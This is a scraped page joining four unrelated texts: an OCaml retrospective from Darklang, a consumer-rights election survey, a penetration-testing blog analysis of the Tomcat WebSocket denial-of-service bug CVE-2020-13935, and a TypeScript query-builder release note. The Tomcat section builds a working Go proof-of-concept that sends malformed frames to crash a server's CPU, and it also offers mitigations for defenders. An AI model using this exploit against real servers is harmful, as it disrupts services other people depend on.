href="https://github.com/darklang/dark/tree/main/containers/postgres-honeytail">Go</a>, to workaround the challenges we've faced.</p><p>The biggest challenge here is our use of Postgres. Postgres is a great database and we're big fans, but Cloud SQL is not a great hosted database. GCP's position is that Cloud SQL is there to tick a box and we should be using Cloud Spanner. I would love to switch to Cloud Spanner, but we have no driver for it in OCaml. Given the Postgres driver in OCaml is not particularly mature, it's hard to expect that a Cloud Spanner driver would exist, and indeed it doesn't. We've had to contribute to the <a href="https://github.com/mmottl/postgresql-ocaml/commit/81a4ae5240decd8f483a90568257cfbc1558c7ed">OCaml Postgres driver</a>, and some parts of our codebase have been <a href="https://github.com/darklang/dark/blob/main/backend/libbackend/serialize.ml#L226">well and truly mangled</a> when working around features not supported in that driver.</p><p>We've also suffered from a lack of a high-level, production web stack (there are <a href="https://github.com/anmonteiro/ocaml-h2">low-level stacks with good reputations</a> that I've struggled to use, and a <a href="https://github.com/oxidizing/sihl">few</a> <a href="https://github.com/reason-native-web/morph">new</a> ones out there that look good), in particular lacking a user authentication module. We've been using <a href="https://auth0.com/">Auth0</a> to work around this for now, which has more moving pieces than I'd like, and a shockingly high cost (our 7000 users, most of whom never log in, costs us over $500/mo).</p><p>We've worked around other missing vendor SDKs by calling their HTTP endpoints directly and that's been mostly fine. However, for libraries like encryption we don't have that option - we <a href="https://github.com/darklang/dark/pull/1455/files">hacked around a missing encryption library</a>, but decided not to ship it to production until we audited it for security (which was never actually worth the cost).</p><p>At CircleCI, we bet on Clojure. That was also a non-mainstream language, but its ability to call Java SDKs meant we had a mature cloud library, which was essential for building CircleCI. Of course, in OCaml we could call C libraries (and <a href="https://github.com/darklang/dark/pull/1841">even Rust libraries</a>, perhaps), but it doesn't match having native libraries we can call directly.</p><h2 id="learnability">Learnability</h2><p>I'm mostly in the camp that anyone can learn any language, but I saw a team struggle with OCaml, and for good reason. Language tutorials are extremely poor in OCaml compared to other languages; they're mostly lecture notes from academic courses.</p><p>The compiler isn't particularly helpful, certainly compared to Rust or Elm (both of which have been in our stack at one point). Often it gives no information about an error. Syntax errors typically say "Syntax error"; though it will try to give a good error for a mismatched brace, often incorrectly. Type errors can be a real burden to read, even after 3 years of experience with it.</p><p>The docs in OCaml are often challenging to find. The <a href="https://ocaml.janestreet.com/ocaml-core/latest/doc/base/index.html">Jane Street docs</a> have improved significantly in the last few years, but it can be a challenge to even figure out what functions are available in a particular module for most libraries. Compare to the excellent <a href="https://docs.rs/">docs.rs</a> in Rust, which has comprehensive API docs for every package in Rust.</p><p>One of the ways I personally struggled in OCaml is around <code>Lwt</code>. Lwt is (one of!) OCaml's async implementations. I couldn't figure it out several years ago and so just built a single-threaded server. The amount of workarounds and downtime we've suffered from that single decision is immense. A tutorial around building high-performance (or even medium performance!) web servers would be very valuable. </p><p>Tooling is something I read would be good in OCaml. I remember reading there was a debugger that could go back in time! I don't know where that's gone but I've never heard of anyone using it.</p><p>We have struggled to make editor tooling work for us. This is partially because we also use ReasonML and this seems to break things. Unfortunately, this is common in programming, but even more so in small communities: you might be the first person to ever try to use a particular configuration.</p><p>Finally, the disconnect between the various tools is immense. You need to understand Opam, Dune, and Esy, to be able to get something working (you could also do it without Esy and just rely on Opam, but that's much worse). I talked about a bunch of these challenges <a href="https://blog.darklang.com/first-thoughts-on-rust-vs-ocaml/">here</a>.</p><h2 id="language-problems">Language problems</h2><p>Multicore is coming Any Day Now™️, and while this wasn't a huge deal for us, it was annoying. </p><h2 id="minor-annoyances">Minor annoyances</h2><p>One of my biggest annoyances was how often OCaml folks talk about Fancy Type System problems, instead of how to actually build products and applications. In other communities for similar languages (ReasonML, Elm, F#), people talk about building apps and solving their problems. In OCaml, it feels like people spend an awful lot of time discussing Functors. It's not quite at the level that I perceived in the Haskell world, but it pointed out that the people building the core of the ecosystem do not have the same problems that I do (which is building web-y stuff).</p><p>I honestly think OCaml was a great choice at the start. Being able to quickly and safely make large-scale changes to your app is something that staticly-typed functional languages excel at. I'm happy that we made the choice, and in retrospect, it still seems like the best choice of those we had at the time.</p><p>I'm working on building the next version of the backend. We have about 20k lines to be replaced, and they'll be rewritten in a new language while keeping the semantics the same. I plan to leave keep the frontend in ReasonML: it doesn't suffer from the same library problems as it can interface nicely to JS, and it's nearly 50k lines of code so it would be a much bigger undertaking.</p><p>Read <a href="https://blog.darklang.com/new-backend-fsharp/">the followup</a> to see what we picked!</p><hr><p><em><em><em><em><em><em><em><em>You can sign up for Dark </em></em></em></em></em></em></em></em><a href="https://darklang.com/signup" rel="noopener nofollow"><em><em><em><em><em><em><em><em>here</em></em></em></em></em></em></em></em></a><em><em><em><em><em><em><em><em>.

<h2><a id="survey-intro"></a>Survey: Americans Agree on The Presidential Candidate They Think Will Protect Their Consumer Rights</h2>
<p><span>With the ongoing threat of Coronavirus and all the difficulty it has introduced into day-to-day life, </span><a href="https://www.pewresearch.org/politics/2020/08/13/election-2020-voters-are-highly-engaged-but-nearly-half-expect-to-have-difficulties-voting/"><span>49% of registered voters in the U.S. report that they expect to have difficulties when it comes time to vote</span></a><span> for a presidential nominee. This is a major uptick from October 2018,&nbsp; when only 15% reported feeling the same way.&nbsp;</span></p>
<p><span>But, despite the uncertainties and hardships 2020 has wrought, the Pew Research Center found that engagement in this presidential election is the highest this country has seen in </span><i><span>decades</span></i><span>.&nbsp;</span></p>
<p><span>In fact, </span><a href="https://www.pewresearch.org/politics/2020/08/13/views-of-the-2020-campaign-and-voting-in-november/"><span>83% of voters say it “really matters” to them who wins the presidency</span></a><span> — the highest percentage since 2000.</span></p>
<p><span>And in a time when people feel more passionate about their politics than </span><i><span>ever</span></i><span>, it may come as a surprise that there is one very important issue upon which the majority of Americans agree: </span><b>Consumer rights</b><span>.&nbsp;</span></p>
<p><span>In this <a href="https://fairshake.com/consumer-news/survey-bipartisan-favor-stronger-consumer-protections/">representative survey of over 1,000 American adults that FairShake conducted in the fall of 2020</a>, we uncovered how the majority of U.S. citizens feel about their rights as consumers — and which of the leading presidential candidates they agree is more likely to protect these rights from being violated.</span></p>
<h2><span><a id="survey-methodology"></a>FairShake’s Survey Methodology</span></h2>
<p><span>For this survey, FairShake surveyed 1,003 American adults using a Pollfish.com survey that ran online from Sept. 21, 2020, to Oct. 5, 2020.</span></p>
<p><span>Results were stratified by Pollfish to match the gender and age distribution of the U.S. population, but before accounting for stratification…&nbsp;&nbsp;</span></p>
<p><span>Respondents were:</span></p>
<ul>
<li><span>60% female</span></li>
<li><span>40% male</span></li>
</ul>
<p><span>The age breakdown of survey respondents was:</span></p>
<ul>
<li><span>7% were aged 18-24</span></li>
<li><span>28% were aged 25-34</span></li>
<li><span>29% were aged 36-44</span></li>
<li><span>16% were aged 45-54</span></li>
<li><span>20% were aged 55 and up</span></li>
</ul>
<p><span>The self-identified party affiliation of respondents was:</span></p>
<ul>
<li><span>36% Democratic Party</span></li>
<li><span>33% Republican Party</span></li>
<li><span>31% reported “no party preference” or “other”</span></li>
</ul>
<p><span>Please keep in mind that totals may not add to 100% due to rounding and, finally, enjoy our synthesis of some of the most interesting results from our survey!&nbsp;</span></p>
<h2><span><a id="survey-consumer-protections"></a>Across the Aisle, Americans Agree: We Need Stronger Consumer Protections&nbsp;</span></h2>
<p><span>In the U.S., </span><a href="https://fairshake.com/guides/consumer-protection-laws/"><span>there are federal and state laws that outline consumer rights and protect customers</span></a><span> when they interact with companies that are in a position to take advantage of them.</span></p>
<p><span>Have you ever felt cornered into using the only </span><i><span>reasonable</span></i><span> internet service provider in your town? Or wished there was more you could’ve done to fight that unfair fee you had to pay before your provider would turn your cable back on?</span></p>
<p><span>If so, you’re not alone in feeling like your consumer rights have been violated by some of the companies that have the most impact on our lives.&nbsp;&nbsp;</span></p>
<p><span>In our survey, we found that — generally speaking — the majority of Americans don’t think the current consumer protections are strong enough when it comes to limiting monopolization by service providers, controlling companies that collect our personal data, and supporting people who work in the gig economy.&nbsp;</span></p>

<p><span>With the only plurality we’ll see when it comes to the section of our survey on consumer protections, 47% of Americans are in favor of stronger government laws and regulations around monopolization by service providers — such as cable and internet companies. Only 15% think government oversight should actively be made weaker here. To break it down further, 54% of respondents who identified as Democrats are in favor of more consumer rights protections while 37% of Republicans feel the same.&nbsp;</span></p>
<p><span>In our survey, Americans agree the most on stronger governance when it comes to companies that collect consumer data — think giants like Facebook and Google. In all, 63% of respondents favor stronger consumer rights laws for these companies while only 6% think such regulations should be weaker. This is the strongest area of bipartisan agreement in our entire survey, supported by 62% of Democrats and 59% of Republicans!&nbsp;</span></p>
<p><span>When it comes to government rules and regulations that protect workers who perform contracted “gig” jobs such as driving for Uber and food delivery services like Postmates, 54% of Americans support stronger legal protections for workers while 4% are for weakening these protections. With 60% of Democrats and only 42% of Republicans in favor of better safeguarding gig workers’ rights, this gap of 18 percentage points is the largest between parties when it comes to consumer rights protections.</span></p>
<h2><span><a id="survey-biden-vs-trump"></a>Respondents Think Former Vice President Joe Biden Cares More About Consumer Rights and President Donald Trump More About Corporate Rights</span></h2>
<p><span>Now, let’s drill down a little deeper to see how respondents feel about the leading presidential candidates — former Vice President Joe Biden and incumbent President Donald Trump — when it comes to protecting consumer rights.&nbsp;</span></p>
<p><span>Again, we see Americans reach across the aisle to agree: The majority opinion is that Joe Biden cares more about the rights of individual consumers while President Donald Trump cares more about the rights of corporations.&nbsp;</span></p>
<p><span>Specifically, 56% of all respondents say they perceive President Trump as caring more about corporations while 18% think he cares more about individual consumers.</span></p>
<p><span>Meanwhile, 39% of people say Joe Biden cares more about individual consumer rights while 31% think he cares more about corporations.<img src="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1.jpg" alt="Graph shows respondents believe Trump will protect corporations over consumers" width="2022" height="1032" srcset="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1.jpg 2022w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-300x153.jpg 300w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-1024x523.jpg 1024w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-768x392.jpg 768w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-1536x784.jpg 1536w" sizes="(max-width: 2022px) 100vw, 2022px" data-srcset="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1.jpg 2022w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-300x153.jpg 300w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-1024x523.jpg 1024w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-768x392.jpg 768w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1-1536x784.jpg 1536w" data-src="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/02-Image-1.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></span></p>
<h2><span><a id="survey-trump-corporate-wrongdoing"></a>President Donald Trump Voted “Most Likely” to Turn a Blind Eye to Corporate Wrongdoing</span></h2>
<p><span>In light of the last section about consumer versus corporate rights, it shouldn’t be shocking to hear that the majority of Americans think Trump (51%) would be more likely than Biden (29%) to turn a blind eye if a corporation violated consumer rights. It’s interesting to note that a not-small percentage (20%) of Americans think both candidates would behave the same in this situation. <img src="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1.jpg" alt="Graph shows respondents believe Trump is more likely to turn a blind eye to consumer rights violations" width="2022" height="1287" srcset="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1.jpg 2022w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-300x191.jpg 300w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-1024x652.jpg 1024w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-768x489.jpg 768w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-1536x978.jpg 1536w" sizes="(max-width: 2022px) 100vw, 2022px" data-srcset="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1.jpg 2022w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-300x191.jpg 300w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-1024x652.jpg 1024w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-768x489.jpg 768w, https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1-1536x978.jpg 1536w" data-src="https://4bvihq1vzfw92gpacq41usu0-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/01-Image-1.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></span></p>
<p><span>Interestingly, respondents replied as expected along party lines when asked which of these two presidential candidates would better protect their individual rights.&nbsp;</span></p>
<p><span>As for protecting consumer rights, 85% of Democrats say Biden would do a better job and 79% of Republicans think Trump would excel. When it comes to worker rights, 83% of Democrats think Biden would better preserve worker rights while 79% of Republicans say Trump would best protect workers.&nbsp;</span></p>
<h2><span>Do You Need Help Defending Your Consumer Rights?&nbsp;</span></h2>
<p><span>In an election year racked by a worldwide pandemic and a heightened level of political division, it’s comforting to know that Americans can generally agree on one thing: The importance of protecting consumers from predatory practices carried out by service provider monopolies, data-collecting giants, and the contractor-supported companies that power today’s gig economy.&nbsp;</span></p>
<p><span>If you’ve personally been taken advantage of by one of these or any </span><i><span>other</span></i><span> company, there’s finally something you can do about it.&nbsp;</span></p>

    <p>Apache Tomcat is a Java application server commonly used with web applications, which we
often encounter in penetration tests.</p>
<p>In this post we will dive into the analysis of a vulnerability in the Apache Tomcat server
and an exploit which helped our customer to assess the risk on their business. The
vulnerability is a denial-of-service vulnerability appearing in conjunction with
WebSockets, and has been assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13935">CVE-2020-13935</a>
.</p>
<p>During penetration tests, we often see instances running outdated versions of Apache
Tomcat.</p>
<p>
    We classify software as “outdated” if a given version contains vulnerabilities for
which the vendor (or maintainer) has released a corresponding security update. However,
some vulnerabilities are only exploitable in certain scenarios and upgrading the web
application server might be costly. Therefore, it is essential to have concise information
to make an informed decision on whether the vulnerability affects a given product and
whether an upgrade is worthwhile. Unfortunately, not all vendors/maintainers are
transparent about security.
</p>

<p>The <a href="https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.37">release notes for Apache Tomcat
9.0.37</a> show
that a vulnerability has been found and patched in July 2020, stating the following:</p>
<blockquote>
<p>The payload length in a WebSocket frame was not correctly validated. Invalid
payload lengths could trigger an infinite loop. Multiple requests with invalid
payload lengths could lead to a denial of service.</p>
</blockquote>
<p>This information is quite vague, resulting in the following questions:</p>
<ul>
<li>What constitutes an <em>invalid</em> payload length?</li>
<li>What kind of denial-of-service occurs? CPU or memory exhaustion? Maybe even a crash?</li>
<li>Under which circumstances are applications vulnerable? When does Apache Tomcat parse WebSocket messages?</li>
<li>What investment do attackers need to make? Does exploitation require a large amount of bandwidth or computing power?</li>
<li>Are there possible workarounds for cases where an upgrade is not feasible?</li>
</ul>
<p>These questions can be answered with some analysis, and (among many other things) that
is also part of our penetration tests.</p>
<h3 id="the-patch">The Patch</h3>
<p>The Apache security team linked the corresponding
<a href="https://github.com/apache/tomcat/commit/40fa74c74822711ab878079d0a69f7357926723d">patch</a>
for this vulnerability. The following code was added to
<code>java/org/apache/tomcat/websocket/WsFrameBase.java</code>, fixing the vulnerability
(reformatted for legibility):</p>
<div><pre><code data-lang="java"><span>// The most significant bit of those 8 bytes is required to be zero
</span><span>// (see RFC 6455, section 5.2). If the most significant bit is set,
</span><span>// the resulting payload length will be negative so test for that.
</span><span></span><span>if</span> <span>(</span><span>payloadLength</span> <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
    <span>throw</span> <span>new</span> <span>WsIOException</span><span>(</span>
        <span>new</span> <span>CloseReason</span><span>(</span>
            <span>CloseCodes</span><span>.</span><span>PROTOCOL_ERROR</span><span>,</span>
            <span>sm</span><span>.</span><span>getString</span><span>(</span><span>"wsFrame.payloadMsbInvalid"</span><span>)</span>
        <span>)</span>
    <span>);</span>
<span>}</span>
</code></pre></div><p>As we can see, the change consists of an additional check on the payload length field,
which is of the type <code>long</code>, raising an exception if the value is negative. But how can
a payload length be negative?</p>
<p>In order to answer this question, let us take a look at the structure of a WebSocket frame,
provided in the <a href="https://tools.ietf.org/html/rfc6455#section-5.2">corresponding RFC</a>:</p>
<pre><code>0                   1                   2                   3

+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |

+---------------------------------------------------------------+
</code></pre><p>The first 16 bits of a frame contain several bit flags as well as a 7-bit payload length.
If this payload length is set to 127 (binary 1111111), the chart indicates that a
so-called <em>extended</em> payload length of 64 bit should be used. Additionally, the WebSocket
RFC states:</p>
<blockquote>
<p>If [the 7-bit payload length is] 127, the following 8 bytes interpreted as a 64-bit
unsigned integer (the most significant bit MUST be 0) are the payload length.</p>
</blockquote>
<p>It seems to be a peculiar choice that despite the field clearly being a 64-bit unsigned
integer, the RFC <em>additionally</em> requires the most significant bit to be zero. Perhaps
this choice was made to provide interoperability with signed implementations, however it
may cause confusion. In this case it even led to a security vulnerability.</p>
<h3 id="writing-an-exploit">Writing an Exploit</h3>
<p>In the following we will implement a proof-of-concept in Go. Why Go you might ask? Go is
awesome ❤️ and built-in concurrency as well as good library support for WebSockets
come in handy. Furthermore, we are able to cross-compile the PoC for any platform we
need to.</p>
<p>Let’s move along the specification and construct a WebSocket frame that has a negative
payload length when parsed by Apache Tomcat. First, the values for the bit flags <code>FIN</code>,
<code>RSV1</code>, <code>RSV2</code> and <code>RSV3</code> need to be chosen. <code>FIN</code> is used to indicate the final frame of
a message. As the whole message that we want to send is contained in a single frame, we
set this bit to one. The RSV bits are reserved for future use and extensions to the
WebSocket specification, so they are all set to zero. The <code>opcode</code> field (4 bit)
represents the type of the sent data. The value has to be valid, otherwise the frame would
be dropped. In this case, we want to send a simple text payload, which requires this field
to be set to the value 1. The Go library <code>github.com/gorilla/websocket</code> provides a
constant for that which we will use. Now we can already construct the first byte of our
malicious WebSocket frame:</p>
<div><pre><code data-lang="golang"><span>var</span> <span>buf</span> <span>bytes</span>.<span>Buffer</span>

<span>fin</span> <span>:=</span> <span>1</span>
<span>rsv1</span> <span>:=</span> <span>0</span>
<span>rsv2</span> <span>:=</span> <span>0</span>
<span>rsv3</span> <span>:=</span> <span>0</span>
<span>opcode</span> <span>:=</span> <span>websocket</span>.<span>TextMessage</span>

<span>buf</span>.<span>WriteByte</span>(<span>byte</span>(<span>fin</span><span>&lt;&lt;</span><span>7</span> | <span>rsv1</span><span>&lt;&lt;</span><span>6</span> | <span>rsv2</span><span>&lt;&lt;</span><span>5</span> | <span>rsv3</span><span>&lt;&lt;</span><span>4</span> | <span>opcode</span>))
</code></pre></div><p>The first bit of the second byte is the <code>MASK</code> bit, which must be set to one in
frames being sent from the client to the server. The interesting part is the
payload length, which can vary in size. If the payload size of the WebSocket
message doesn’t exceed 125 bytes, the length can be encoded directly in the
7-bit payload length field. For payload lengths between 126 and 65535, the
7-bit payload length field is set to the constant 126 and the payload length is
encoded as a 16-bit unsigned integer in the next two bytes. For larger
payloads, the 7-bit payload length field must be set to 127 and the next four
bytes encode the payload length as an 64-bit unsigned integer. As discussed
before, for the payload length being defined in 64 bits the most significant
bit (MSB) must be set to zero according to the specification. To trigger the
vulnerable code path in Apache Tomcat we need to specify a 64-bit payload
length with the MSB set to one, so we set the 7-bit payload length field to
1111111:</p>
<div><pre><code data-lang="golang"><span>// always set the mask bit
</span><span>// indicate 64 bit message length
</span><span></span><span>buf</span>.<span>WriteByte</span>(<span>byte</span>(<span>1</span><span>&lt;&lt;</span><span>7</span> | <span>0</span><span>b1111111</span>))
</code></pre></div><p>In order to construct a frame with an invalid payload length, triggering the misbehavior
in the Apache Tomcat implementation, we set the following eight bytes to <code>0xFF</code>:</p>
<div><pre><code data-lang="golang"><span>// set msb to 1, violating the spec and triggering the bug
</span><span></span><span>buf</span>.<span>Write</span>([]<span>byte</span>{<span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>, <span>0xFF</span>})
</code></pre></div><p>The following four bytes are the masking key. The specification requires this to be a
random 32-bit value from a strong source of entropy, but as we violate the specification
already, we just use a static masking key to make the code easier to read:</p>
<div><pre><code data-lang="golang"><span>// 4 byte masking key
</span><span>// leave zeros for now, so we do not need to mask
</span><span></span><span>maskingKey</span> <span>:=</span> []<span>byte</span>{<span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>}
<span>buf</span>.<span>Write</span>(<span>maskingKey</span>)
</code></pre></div><p>The actual payload itself can be smaller than the specified length:</p>
<div><pre><code data-lang="golang"><span>// write an incomplete message
</span><span></span><span>buf</span>.<span>WriteString</span>(<span>"test"</span>)
</code></pre></div><p>The assembly and transmission of our packet looks as follows. For good measure, we are
keeping the connection open for 30 seconds after sending:</p>
<div><pre><code data-lang="golang"><span>ws</span>, <span>_</span>, <span>err</span> <span>:=</span> <span>websocket</span>.<span>DefaultDialer</span>.<span>Dial</span>(<span>url</span>, <span>nil</span>)

<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
    <span>return</span> <span>fmt</span>.<span>Errorf</span>(<span>"dial: %s"</span>, <span>err</span>)
}

<span>_</span>, <span>err</span> = <span>ws</span>.<span>UnderlyingConn</span>().<span>Write</span>(<span>buf</span>.<span>Bytes</span>())
<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
    <span>return</span> <span>fmt</span>.<span>Errorf</span>(<span>"write: %s"</span>, <span>err</span>)
}

<span>// keep the websocket connection open for some time
</span><span></span><span>time</span>.<span>Sleep</span>(<span>30</span> <span>*</span> <span>time</span>.<span>Second</span>)
</code></pre></div><p>The code for this proof-of-concept exploit is available at
<a href="https://github.com/RedTeamPentesting/CVE-2020-13935">github.com/RedTeamPentesting/CVE-2020-13935</a>.</p>
<p>Build the executable by just running <code>go build</code>. To test the program, we can
set up a vulnerable Apache Tomcat instance and target one of the WebSocket
examples provided with the installation:</p>
<pre><code>$ ./tcdos ws://localhost:8080/examples/websocket/echoProgrammatic
</code></pre><p>That is all it takes to exploit the denial-of-service vulnerability. If a
vulnerable WebSocket endpoint is now targeted and multiple malicious requests
are made, the CPU usage goes up quite quickly and the server becomes
unresponsive.</p>
<div>
        <p><img src="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/tomcat-dos-websocket-htop-100_hu5583c87e5b77df98ebe277e763ed8450_92893_640x0_resize_box_2.png" alt="htop run on server during exploitation">
        </p>
    </div>



<p>Note that the parsing code is only triggered with endpoints that actually expect
WebSocket messages. We cannot send such a message to an arbitrary Tomcat HTTP endpoint.</p>
<p>According to the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13935">vulnerability description</a> the following versions of Apache Tomcat are affected:</p>
<ul>
<li>10.0.0-M1 to 10.0.0-M6</li>
<li>9.0.0.M1 to 9.0.36</li>
<li>8.5.0 to 8.5.56</li>
<li>7.0.27 to 7.0.104</li>
</ul>
<h3 id="for-defenders">For Defenders</h3>
<p>If possible, update your Apache Tomcat server to the current version. However, there might
be cases when updating is not feasible or very costly. In this case, you should evaluate
whether your product is vulnerable. As explained above, the bug can only be triggered on
WebSockets endpoints. Therefore, disabling or restricting access to those endpoints will
mitigate …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>It’s been almost 3 years since I started working on this query builder idea of mine. Today is finally the day Mammoth hits 1.0. Mammoth is a no-batteries-included type-safe Postgres query builder for TypeScript. Hooray!</p><figure><pre><code>db.with(
  `regionalSales`,
  () =&gt;
    db
      .select(db.orderLog.region, sum(db.orderLog.amount).as(`totalSales`))
      .from(db.orderLog)
      .groupBy(db.orderLog.region),
  `topRegions`,
  ({ regionalSales }) =&gt;
    db
      .select(regionalSales.region)
      .from(regionalSales)
      .where(
        regionalSales.totalSales.gt(
          db.select(sum(regionalSales.totalSales).divide(10)).from(regionalSales),
        ),
      ),
  ({ topRegions }) =&gt;
    db
      .select(
        db.orderLog.region,
        db.orderLog.product,
        sum(db.orderLog.quantity).as(`productUnits`),
        sum(db.orderLog.amount).as(`productSales`),
      )
      .from(db.orderLog)
      .where(db.orderLog.region.in(db.select(topRegions.region).from(topRegions)))
      .groupBy(db.orderLog.region, db.orderLog.product),
);</code></pre><figcaption>Example of a massive but type-safe query</figcaption></figure><p>The no-batteries-included part is a wink to Knex.js and hints at Mammoth’s opposing ideas. Knex.js supports many SQL dialects and bundles the approriate database drivers (as peer dependencies, yes). Mammoth, however, only supports one SQL dialect, Postgres, and bundles no database driver.</p><p>Creating a cross-database query builder like Knex.js is an amazing challenge, one that Knex.js set out to take on, but not me. To me, creating a cross-database query builder basically means constructing a new SQL dialect. For all the differences in the existing dialects you have to construct a new generic concept. But I like SQL. It's ubiquoutus and versatile. Especially Postgres. And this new language wouldn't be.</p><p>In Knex.js the INSERT INTO .. ON CONFLICT is nowhere to be found. This SQL clause is missing even though it's been released <a href="https://www.postgresql.org/docs/9.5/index.html">more than 4 years ago</a>. The problem? The contributors had to introduce a new concept and try to avoid anything database-specific. I think this is an example how hard it is to create this new cross-database language. Weighing the pros and cons without being database-specific. This challenge becomes clear in this <a href="https://github.com/knex/knex/pull/2197">pull request</a> discussing insert into on conflict.</p><p>An often touted benefit of a cross-database solution is to be able to easily switch between different databases. Not at runtime but if you later decide to migrate from one database to another. But a cross-database approach isn't the only option. Instead, I think, a multi-database solution is a good strategy when you're operating in a type-safe world. Where the former focusses on speaking to different databases using a single API, the latter offers a database-specific API, but type-safe, thus, multi. Meaning, you would still be able to switch between databases, and you would see breaking changes at compile time. Fix the errors and you can be confident you support the new database.</p><blockquote>Of course this ignores the whole topic of needing to actually migrate data from one database to another. This is why, in my opinion, you never really just switch from one database to another.</blockquote><p>Mammoth is sticking as close to SQL as possible. This comes with a set of challenges when building Mammoth, but it should make it easier to adopt Mammoth in a project or onboard new developers. I want a minimal abstraction, not a new generic SQL language, an ORM or something even more massive like Prisma. If you want to speak to your database, but it requires re-learning a lot you already know how to do in SQL, something is wrong. And all this re-learning is often not transferable to different languages or environment, which makes part of this learning wasteful.</p><p>As an alternative, there are amazing tools available which generate types by reading your queries and reading the remote database schema. While these do solve the type-safety challenges and stick to SQL, I feel requiring a watch on file changes so types can get re-generated isn't ideal. Instead, with an advanced enough type-safe query builder you can have the same features without this build step.</p><p>Mammoth aims to fix exactly that. Here are some examples that I think work great. All the result types are automatically inferred. </p><figure><pre><code>const rows = await db
    .select(db.foo.id, db.bar.name)
    .from(db.foo)
    .leftJoin(db.bar)
    .on(db.bar.fooId.eq(db.foo.id));</code></pre><figcaption>Left join — <code>name</code> automatically becomes optional</figcaption></figure><figure><pre><code>const [{count}] = await db.select(count()).from(db.foo);</code></pre><figcaption>Simple select with count(*)</figcaption></figure><figure><pre><code>const affectedCount = await db
  .insertInto(db.foo)
  .values({
    name: `Test`,
  })
  .onConflict(`id`)
  .doUpdateSet({
    name: `Test 2`,
  });</code></pre><figcaption>Insert into .. on conflict</figcaption></figure><figure><pre><code>const affectedCount = await db.update(db.foo).set({ name: `Test`, value: 123 });</code></pre><figcaption>Just an update returning the affected count</figcaption></figure><figure><pre><code>db
  .select(db.foo.id)
  .from(db.foo)
  .where(db.foo.id.in(db.select(db.bar.fooId).from(db.bar)));</code></pre><figcaption>Select with where in expression</figcaption></figure><p>Mammoth 1.0 is production-ready. I've been using it in a project for some time already. It's not feature-complete though but should support most use cases and give you automatic type safety in a lot of places. It also offers excellent autocomplete and Mammoth tries hard not to pullute the public API. The first version of the <a href="https://mammoth.tools/">Mammoth query builder documentation</a> is also up.</p><p>I created a couple of issues labeled with <em><a href="https://github.com/Ff00ff/mammoth/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22">good first issue</a>. </em>These issues are great for someone new to the codebase to pick up—and they really add value. I'm available to help you get started. Just claim the issue and let me know if you have any questions. If you always wanted to work on some open source, now is your time!</p><p>Last but no least, I started working on mammoth-cli to automatically generate migrations based on your table definitions. This is the next big piece to get right to make sure your database schema actually matches your table definitions. Also, this should make the developer experience of using Mammoth even better. <a 